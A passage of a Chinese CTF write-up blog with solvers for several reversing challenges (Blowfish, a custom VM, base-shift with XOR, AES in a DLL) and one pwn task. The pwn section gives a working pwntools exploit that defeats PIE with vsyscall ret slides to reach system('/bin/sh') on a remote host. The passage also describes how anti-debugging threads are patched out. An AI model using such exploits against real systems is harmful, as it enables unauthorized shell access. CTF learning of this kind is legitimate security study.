class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        Blowfish_Encrypt(ctx, &amp;datal, &amp;datar);</span><br><span class="line">        ctx-&gt;P[i] = datal;</span><br><span class="line">        ctx-&gt;P[i + <span class="number">1</span>] = datar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j += <span class="number">2</span>) &#123;</span><br><span class="line">            Blowfish_Encrypt(ctx, &amp;datal, &amp;datar);</span><br><span class="line">            ctx-&gt;S[i][j] = datal;</span><br><span class="line">            ctx-&gt;S[i][j + <span class="number">1</span>] = datar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">16</span>, <span class="number">181</span>,  <span class="number">42</span>, <span class="number">236</span>, <span class="number">176</span>,  <span class="number">80</span>, <span class="number">177</span>,  <span class="number">35</span>,  <span class="number">64</span>,  <span class="number">58</span>,</span><br><span class="line">        <span class="number">39</span>, <span class="number">124</span>,  <span class="number">30</span>,  <span class="number">83</span>,  <span class="number">41</span>,  <span class="number">31</span>, <span class="number">177</span>,  <span class="number">21</span>,  <span class="number">54</span>,  <span class="number">40</span>,</span><br><span class="line">        <span class="number">251</span>,  <span class="number">17</span>, <span class="number">191</span>, <span class="number">225</span>,  <span class="number">50</span>,  <span class="number">30</span>, <span class="number">197</span>,  <span class="number">18</span>, <span class="number">228</span>,  <span class="number">96</span>,</span><br><span class="line">        <span class="number">172</span>,  <span class="number">64</span></span><br><span class="line">    &#125;;<span class="comment">//题目中的加密数据</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = <span class="string">"R3v3rs3!"</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">33</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    Blowfish_Init(&amp;ctx, key, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> *l = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars + <span class="number">4</span> * i));</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> *r = ((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars + <span class="number">4</span> * (i+<span class="number">1</span>)));</span><br><span class="line">        </span><br><span class="line">        *l = _byteswap_ulong(*l), *r = _byteswap_ulong(*r);</span><br><span class="line">        Blowfish_Decrypt(&amp;ctx, l, r);</span><br><span class="line">        *l = _byteswap_ulong(*l), *r = _byteswap_ulong(*r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag&#123;"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, ida_chars[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817165817614.png" alt="image-20200817165817614"></p><p>python的话，找到了可以使用Crypto模块。</p><p><a href="https://www.cnblogs.com/ws17345067708/p/10552836.html" target="_blank" rel="noopener">安装</a></p><p>goole和百度下<a href="https://blog.csdn.net/yyhustim/article/details/8539065?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param" target="_blank" rel="noopener">用法</a>：得到和C语言中一样的结果：</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817170245529.png" alt="image-20200817170245529"></p><p>最后，本题关键就是算法的学习。</p><h2 id="magic-number-pwn"><a href="#magic-number-pwn" class="headerlink" title="magic_number (pwn)"></a>magic_number (pwn)</h2><blockquote><p>第一次遇到，利用vsyscall中的ret指令充当滑梯，直到可以通过覆盖低字节处得到我们指定函数的地址。</p></blockquote><p>查保护：关键就是程序开启了PIE。</p><blockquote><p>PIE全称是position-independent  executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址。</p></blockquote><p>本题，栈溢出，控制程序走向即可。但难的就是有PIE使程序每次加载的地址不一样。</p><p>利用vsyscall绕过PIE。<strong>可以利用的地址是0xffffffffff600000、0xffffffffff600400、 0xffffffffff600800</strong>，因为他们是不变的。</p><p>首先查看利用proc文件查看程序加载的基地址：<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210254714.png" alt="image-20200911210254714"></p><p>更改ida载入的基地址使其与之对应。找到要下断的地址。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210500410.png" alt="image-20200911210500410"></p><p>gdb下断调试，通过查看栈确定需要使用vsyscall的个数。可以看到使用4个即可。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911210854601.png" alt="image-20200911210854601"></p><p>找到需要控制程序走向的目的地址。（即system(‘bin/sh’);）<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200911211045084.png" alt="image-20200911211045084"></p><p>所以最后只需将最低字节的<strong>80</strong>覆盖为<strong>A8</strong>即可。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>, <span class="number">10053</span>)</span><br><span class="line"><span class="comment">#p = process('./8')</span></span><br><span class="line">pay = <span class="string">'B'</span>*<span class="number">0x38</span>+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+p64(<span class="number">0xFFFFFFFFFF600400</span>)+<span class="string">b'\xA8'</span></span><br><span class="line">p.recvuntil(<span class="string">'Your Input :'</span>)</span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="VM-WORLD（re）"><a href="#VM-WORLD（re）" class="headerlink" title="VM_WORLD（re）"></a>VM_WORLD（re）</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1BYmMrqGaiKT6W_HVd9eoPA" target="_blank" rel="noopener">https://pan.baidu.com/s/1BYmMrqGaiKT6W_HVd9eoPA</a><br>提取码：5b5o<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote><p>一个简单的虚拟机题目，从学校师傅哪里学会了修复ida无法F5switch语句的方法。</p><p>首先简单看一下:<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912171012942.png" alt="image-20200912171012942"></p><p>所以进入OD动态到关键函数，并dump出，载入ida：可以看到是不能F5的。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912171258533.png" alt="image-20200912171258533"></p><p>但看了一下这个函数的代码也不是很长，直接读汇编将其写成了C语言代码：一个简单的虚拟机。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op[] = &#123;<span class="number">0xF0</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xF6</span>, <span class="number">0xF4</span>, <span class="number">0xF1</span>, <span class="number">0xF7</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> input[] = <span class="string">"aaaaaaaaaaaaaaaaa"</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">n = op[i]<span class="number">-0xf0</span>;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">s[k] = input[j] &amp; <span class="number">0xFF</span>;</span><br><span class="line">k++, i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">k--;</span><br><span class="line">input[j<span class="number">-1</span>] = s[k];</span><br><span class="line">i++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">k--;</span><br><span class="line">temp = s[k];</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp += op[i+<span class="number">1</span>];</span><br><span class="line">i += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">t = i;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t = s[k<span class="number">-1</span>];</span><br><span class="line">ans = t ^ temp;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">i = ans;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">s[k<span class="number">-1</span>] = ans;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">j++;</span><br><span class="line">i++; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">t = i;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t = s[k<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(t == <span class="number">0</span> || t == <span class="number">10</span>)</span><br><span class="line">i += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> _64 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(input[_64])</span><br><span class="line">&#123;</span><br><span class="line">_64++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == _64)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(input); i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, input[i]); </span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就只有异或和加减操作，简答逆一下即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">11</span>,  <span class="number">12</span>,   <span class="number">5</span>,  <span class="number">19</span>,  <span class="number">73</span>,  <span class="number">87</span>,   <span class="number">3</span>,  <span class="number">91</span>,  <span class="number">13</span>,  <span class="number">12</span>, </span><br><span class="line">    <span class="number">4</span>,  <span class="number">10</span>,  <span class="number">20</span>,  <span class="number">75</span>,  <span class="number">84</span>,  <span class="number">82</span>,  <span class="number">83</span>,  <span class="number">31</span>,  <span class="number">26</span>,  <span class="number">84</span>, </span><br><span class="line">   <span class="number">86</span>,  <span class="number">86</span>,  <span class="number">73</span>,  <span class="number">76</span>,   <span class="number">2</span>,  <span class="number">91</span>,  <span class="number">94</span>,  <span class="number">72</span>,  <span class="number">74</span>,  <span class="number">83</span>, </span><br><span class="line">   <span class="number">82</span>,   <span class="number">4</span>,  <span class="number">83</span>,  <span class="number">84</span>,   <span class="number">2</span>,  <span class="number">92</span>,  <span class="number">11</span>,   <span class="number">3</span>,   <span class="number">6</span>,   <span class="number">2</span>, </span><br><span class="line">   <span class="number">69</span>, <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">40</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">ida_[i] = (ida_[i]^ida_[i+<span class="number">1</span>])<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(ida_[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;5aa97418-e2a1-4a4c-ba9d-d6eb0ed91147&#125;</span></span><br></pre></td></tr></table></figure><p>后面问了出题师傅，才知道那个是可以修复一下的。其实就是switch语句的每个跳转用了一张表来存储，但由于基地址等对不上，导致分析出错。</p><p>所以首先修改与表对应的基地址，然后恢复储存跳转的表。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912172413213.png" alt="image-20200912172413213"></p><p>最后手动修改swicth的声明：<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912172623345.png" alt="image-20200912172623345"></p><h2 id="olfo-2020-10-17-n1ctf"><a href="#olfo-2020-10-17-n1ctf" class="headerlink" title="olfo(2020.10.17 n1ctf)"></a>olfo(2020.10.17 n1ctf)</h2><p>首先打开ida看不到发现没有找到main函数，这是加了花指令，ida找不到。。从start可以看到。</p><p>花指令很少（2种）也很简单，手动去除都可。。</p><p>jmp</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20201017173801189.png" alt="image-20201017173801189"></p><p>call</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20201017173819199.png" alt="image-20201017173819199"></p><p>然后就是用fork()函数创建一个子进程，返回2次，当是父进程时返回一个大于0的数，且在父进程使用ptrace函数获得一些后面异或需要的数据。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20201017174401711.png" alt="image-20201017174401711"></p><p>对于我，关键就是fork（）多进程的调试，这里ida我动调一直在wait状态。。</p><p>然后找到gdb多进程调试。使用<strong>set follow-fork-mode [parent|child]</strong>指定调试的进程，用<strong>show follow-fork-mode</strong>查看被调试的进程。<a href="https://blog.csdn.net/fingding/article/details/46459095" target="_blank" rel="noopener">fork 多进程调试</a></p><p>其它的就不说了，最后直接idapython得到flag。</p><p>还有就是一篇关于ptrace理解的文章（很详细）：<a href="https://www.cnblogs.com/mysky007/p/11047943.html" target="_blank" rel="noopener">ptrace</a></p><h2 id="ctfshow-大牛杯（2021-5-4）"><a href="#ctfshow-大牛杯（2021-5-4）" class="headerlink" title="ctfshow_大牛杯（2021/5/4）"></a>ctfshow_大牛杯（2021/5/4）</h2><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>一个base移位的操作，然后考了一个逻辑表达式化简，记录一下。</p><p>首先看到移位：</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20210504205241610.png" alt="image-20210504205241610"></p><p>每5个变4个，实质就是把5*8 = 40位，分成了40/10 = 4，1个字节存放不下，所以结果使用dword型数据存放的。这和那些base64，base32都是一个道理，就看怎么分配那些位。base64：除以6；base32：除以5；其它都是依次类推。</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20210504212207209.png" alt="image-20210504212207209"></p><p>然后逻辑表达式运算：4一个都是一样的计算，每次处理4个字节，一共16个字节。把这个运算写出来：(a^b)&amp;(~(a&amp;b)) = a^b；</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20210504210119852.png" alt="image-20210504210119852"></p><p>显然，上面的&amp;运算是不可逆的，数字电路学过这种化简的，对上面可进行如下的化简：最后就是一个异或。</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20210504165847724.png" alt="image-20210504165847724"></p><p>最后开始用C语言写了一个常规的移位还原：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0x000001A9</span>, <span class="number">0x00000233</span>, <span class="number">0x00000179</span>, <span class="number">0x0000017F</span>, <span class="number">0x000001A5</span>, <span class="number">0x000002C6</span>, <span class="number">0x00000137</span>, <span class="number">0x00000358</span>, </span><br><span class="line">    <span class="number">0x000000E1</span>, <span class="number">0x00000305</span>, <span class="number">0x000003EC</span>, <span class="number">0x00000153</span>, <span class="number">0x0000015D</span>, <span class="number">0x00000247</span>, <span class="number">0x0000017B</span>, <span class="number">0x00000201</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>], cnt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">flag[cnt++] = (a[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">flag[cnt++] = ((a[<span class="number">0</span>]&amp;<span class="number">3</span>) &lt;&lt; <span class="number">6</span>) | (a[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">flag[cnt++] = ((a[<span class="number">1</span>]&amp;<span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) | (a[<span class="number">2</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">flag[cnt++] = ((a[<span class="number">2</span>]&amp;<span class="number">0x3f</span>) &lt;&lt; <span class="number">2</span>) | (a[<span class="number">3</span>] &gt;&gt; <span class="number">8</span>);  </span><br><span class="line">flag[cnt++] = a[<span class="number">3</span>] &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">enc[i] ^= <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">decode(enc+<span class="number">4</span>*i);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ba5e_and_x0r_1s_fun!</span></span><br></pre></td></tr></table></figure><p>其实这种用python处理起来是十分方便的，也通用。首先提取出所有的二进制位，然后根据分配原则，还原就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x000001A9</span>, <span class="number">0x00000233</span>, <span class="number">0x00000179</span>, <span class="number">0x0000017F</span>, <span class="number">0x000001A5</span>, <span class="number">0x000002C6</span>, <span class="number">0x00000137</span>, <span class="number">0x00000358</span>, <span class="number">0x000000E1</span>, <span class="number">0x00000305</span>, <span class="number">0x000003EC</span>, <span class="number">0x00000153</span>, <span class="number">0x0000015D</span>, <span class="number">0x00000247</span>, <span class="number">0x0000017B</span>, <span class="number">0x00000201</span>]</span><br><span class="line">enc = [bin(enc[i]^<span class="number">0x20</span>)[<span class="number">2</span>:].zfill(<span class="number">10</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc))]</span><br><span class="line">enc = <span class="string">''</span>.join(enc)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc), <span class="number">8</span>):</span><br><span class="line">    flag += chr(int(enc[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="GKCTF（2021-6）"><a href="#GKCTF（2021-6）" class="headerlink" title="GKCTF（2021.6）"></a>GKCTF（2021.6）</h2><h3 id="KillerAid"><a href="#KillerAid" class="headerlink" title="KillerAid"></a>KillerAid</h3><blockquote><p>链接：<a href="https://pan.baidu.com/s/1ZlVFn7TDXTV93D1XKno-dQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1ZlVFn7TDXTV93D1XKno-dQ</a><br>提取码：omkn</p></blockquote><p>一个C#逆向，C#层是第一层加密，关键加密在dll中。</p><p>使用dnspy看到c#层：涉及输入id和code的简单异或加密。<br><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20220120171135381.png" alt="image-20220120171135381"></p><p>可以看到最后调用了CheckCode函数，这是一个从载入的dll中导出的函数。</p><p>到ida中调试该dll，直接闪退，那一般就是有反调试了，</p><p>直接找了找IsDebuggerPresent相关的函数，确实有但下断后调试根本没有断下来。</p><p>然后猜测是动态获取相关api来调用的方式，像一些恶意文件的做法，也果然在字符串中找了IsDebuggerPresent相关反调试相关的字符串，从字符串定位到：</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20220120171912516.png" alt="image-20220120171912516"></p><p>接着继续向上找相关函数调用，来到的反调试函数，这里面的反调试还不少，多种多样：</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20220120172018647.png" alt="image-20220120172018647"></p><p>继续向上回溯，可以发现是创建一个线程来调用这个这个反调试的函数，那直接将这个创建线程的函数patch掉就能调试了。<br><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20220120172544137.png" alt="image-20220120172544137"></p><p>以上也是本题相对于比较隐藏的一个点，利用动态获取所有要使用的api的方式隐藏反调试的代码。</p><p>后面就很常规了。</p><p>看到从这个dll导出的CheckCode函数，一个标准的aes加密，只是加密了32轮，然后每轮的key和iv不一样，分析时做了一定的注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 